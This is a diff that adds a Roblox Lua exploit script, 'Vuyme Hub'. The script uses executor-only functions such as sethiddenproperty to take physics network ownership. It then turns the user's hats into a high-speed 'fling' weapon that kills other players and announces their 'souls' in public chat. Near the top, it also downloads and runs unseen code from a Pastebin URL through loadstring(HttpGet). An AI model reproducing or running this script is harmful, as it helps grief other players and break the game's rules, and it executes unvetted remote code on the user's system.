@@ -1,0 +1,202 @@
+--[[
+Important: Those are the hats you need to own and wear in order for this script to work
+https://www.roblox.com/catalog/4735272012/Trash-Can
+https://www.roblox.com/catalog/4735336570/Trash-Can-Lid
+https://www.roblox.com/catalog/4876469013/Destructive-Aura
+]]--
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "Vuyme Hub";
+    Text = "Script Remaked By TERES#7678";
+})
+
+loadstring(game:HttpGet("https://pastebin.com/raw/v1MvZeBv"))()
+
+local plr = game.Players.LocalPlayer;
+local chr = plr.Character;
+local hum = chr.Humanoid;
+local hat1 = chr['Trash Can'];
+local hat2 = chr['Trash Can Lid'];
+local hat3 = chr['MeshPartAccessory'];
+hat3.Name = 'Evil';
+local flingmode = true;
+if flingmode then print('Fling mode started.') hat3.Handle.CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0) hat3.Parent = workspace end;
+local b1 = hat1.Handle;
+local b2 = hat2.Handle;
+local b3 = hat3.Handle;
+local soulcount = 0;
+print('Fling: ' .. tostring(flingmode));
+--[[Network]]
+local NetworkAccess = coroutine.create(function()
+while true do game:GetService("RunService").RenderStepped:Wait()
+game:GetService("Players").LocalPlayer.ReplicationFocus = workspace
+game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
+sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge*math.huge) end end)
+coroutine.resume(NetworkAccess)
+
+function msg(str)
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer('[Trash Can] ' .. str, "All");
+end
+
+local soultime = true;
+function collectsoul(r)
+    if soultime then
+        soulcount = soulcount + 1;
+        msg(r .. ' died and their soul has been collected. Total souls: ' .. soulcount);
+        soultime = false;
+        spawn(function() wait(3) soultime = true end);
+    end
+end
+
+b1.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+b1.CanCollide = false;
+b1:BreakJoints();
+for _, k in pairs(hat1:GetChildren()) do
+	if not k:IsA'SpecialMesh' and not k:IsA'Part' then
+		k:Destroy();
+	end
+end
+local still1 = Instance.new('BodyAngularVelocity', b1);
+still1.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+still1.AngularVelocity = Vector3.new(0, -3, 0);
+local align1 = Instance.new('AlignPosition', b1);
+align1.MaxForce = 1000000;
+align1.MaxVelocity = math.huge;
+align1.RigidityEnabled = false;
+align1.ApplyAtCenterOfMass = true;
+align1.Responsiveness = 200;
+local a01 = Instance.new('Attachment', b1);
+local a11 = Instance.new('Attachment', chr.HumanoidRootPart);
+align1.Attachment0 = a01;
+align1.Attachment1 = a11;
+
+b2.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+b2.CanCollide = false;
+b2:BreakJoints();
+for _, k in pairs(hat2:GetChildren()) do
+	if not k:IsA'SpecialMesh' and not k:IsA'Part' then
+		k:Destroy();
+	end
+end
+local still2 = Instance.new('BodyAngularVelocity', b2);
+still2.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+still2.AngularVelocity = Vector3.new(0, 3, 0);
+local align2 = Instance.new('AlignPosition', b2);
+align2.MaxForce = 1000000;
+align2.MaxVelocity = math.huge;
+align2.RigidityEnabled = false;
+align2.ApplyAtCenterOfMass = true;
+align2.Responsiveness = 200;
+local a02 = Instance.new('Attachment', b2);
+local a12 = Instance.new('Attachment', chr.HumanoidRootPart);
+align2.Attachment0 = a02;
+align2.Attachment1 = a12;
+
+b3.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+b3.CanCollide = false;
+b3:BreakJoints();
+for _, k in pairs(hat3:GetChildren()) do
+	if not k:IsA'SpecialMesh' and not k:IsA'Part' then
+		k:Destroy();
+	end
+end
+local still3 = Instance.new('BodyAngularVelocity', b3);
+still3.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+still3.AngularVelocity = Vector3.new(0, 0, 0);
+local align3 = Instance.new('AlignPosition', b3);
+align3.MaxForce = 1000000;
+align3.MaxVelocity = math.huge;
+align3.RigidityEnabled = false;
+align3.ApplyAtCenterOfMass = true;
+align3.Responsiveness = 200;
+local a03 = Instance.new('Attachment', b3);
+local a13 = Instance.new('Attachment', chr.HumanoidRootPart);
+align3.Attachment0 = a03;
+align3.Attachment1 = a13;
+
+local opent = false;
+local opent2 = false;
+local opent3 = false;
+local locx = 0;
+local locz = 0;
+spawn(function()
+    plr:GetMouse().KeyDown:Connect(function(k)
+        if k == 'c' then
+            opent = true;
+        end
+        if k == 'x' then
+            locx = math.random(-4, 8) locz = math.random(-3, 3);
+            opent2 = true;
+        end
+        if k == 'f' then
+            opent3 = true;
+        end
+    end)
+end)
+spawn(function()
+    plr:GetMouse().KeyUp:Connect(function(k)
+        if k == 'c' then
+            opent = false;
+        end
+        if k == 'x' then
+            opent2 = false;
+        end
+        if k == 'f' then
+            opent3 = false;
+        end
+    end)
+end)
+local ist = false;
+local ist2 = false;
+spawn(function()
+    b3.Touched:Connect(function(c)
+        if c.Parent ~= chr and c.Parent:FindFirstChildOfClass'Humanoid' and not ist2 then
+            print'touch'
+            spawn(function() ist2 = true wait(1.5) ist2 = false end);
+            pcall(function()spawn(function()
+                local pler = game.Players[c.Parent.Name];
+                pler.Character.Humanoid.Died:Connect(function()
+                    collectsoul(pler.Name);
+                    game:disconnectscript();
+                end)
+            end)end);
+            ist = true;
+            wait(0.1);
+            ist = false;
+        end
+    end)
+end)
+local rotx = 0;
+local smooth = 0.07;
+local rotz = math.pi / 2;
+game.RunService.RenderStepped:Connect(function()
+    rotx = rotx + 2 / 100;
+    rotz = rotz + 2 / 100;
+    b1.CanCollide = false;
+    b2.CanCollide = false;
+    b3.CanCollide = false;
+    a13.Position = Vector3.new(3.2, -3, 0);
+    if flingmode then still3.AngularVelocity = Vector3.new(0, 100000, 0) else still3.AngularVelocity = Vector3.new(0, 3, 0) end;
+	if opent == false then
+	    a11.Position = a11.Position:Lerp(Vector3.new(3.2, -1.5, 0), smooth);
+	    a12.Position = a12.Position:Lerp(Vector3.new(3.2, 0.2, 0), smooth);
+	    a13.Position = Vector3.new(3.2, -100, 0);
+	else
+	    a11.Position = a11.Position:Lerp(Vector3.new(0, -1.5, -4), smooth);
+	    a13.Position = Vector3.new(0, 1.3, -4);
+	    if ist then
+	        a12.Position = a12.Position:Lerp(Vector3.new(0, 6.8, -4), smooth);
+	        wait(0.5);
+	        a12.Position = a12.Position:Lerp(Vector3.new(0, 0.2, -4), smooth);
+	    else
+	        a12.Position = a12.Position:Lerp(Vector3.new(0, 2.4, -4), smooth);
+	    end
+	end
+	if opent2 == true then
+	    a12.Position = a12.Position:Lerp(Vector3.new(locx, 1.6, locz), smooth);
+	end
+	if opent3 == true then
+	    a11.Position = a11.Position:Lerp(Vector3.new(10.2, -1.5, 0), smooth);
+	    a12.Position = a12.Position:Lerp(Vector3.new(10.2, 0.2, 0), smooth);
+	    a13.Position = Vector3.new(math.sin(rotx) * 5, 0, math.sin(rotz) * 5);
+	end
+end)
